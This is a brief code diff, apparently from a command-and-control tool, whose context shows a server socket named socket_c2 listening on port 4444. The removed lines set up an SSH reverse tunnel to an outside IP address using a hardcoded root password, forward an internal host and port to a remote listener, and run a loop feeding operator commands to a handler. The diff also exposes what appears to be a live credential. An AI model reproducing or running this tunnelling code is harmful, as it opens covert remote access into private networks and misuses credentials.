@@ -140,13 +140,3 @@ def socket_c2():
     server.bind(("", 4444))
     server.listen(5)
 
-if __name__ == "__main__":
-    ssh_tunnel = SSH_Reverser_Tunnel("41.216.182.129", 22, "root", "M~yf*;?zF*v32Db")
-    tunnel_0 = ReverseTunnelData(local_host="192.168.1.130", local_port=8006, remote_port=20000, listening_host="41.216.182.128", listening_port=12001)
-    ssh_tunnel.tunnel_0 = tunnel_0
-    while True:
-        commnad = input("\nEnter command: ")
-        if not command_handler(commnad):
-            break
-        time.sleep(1)
-    del ssh_tunnel.tunnel_0
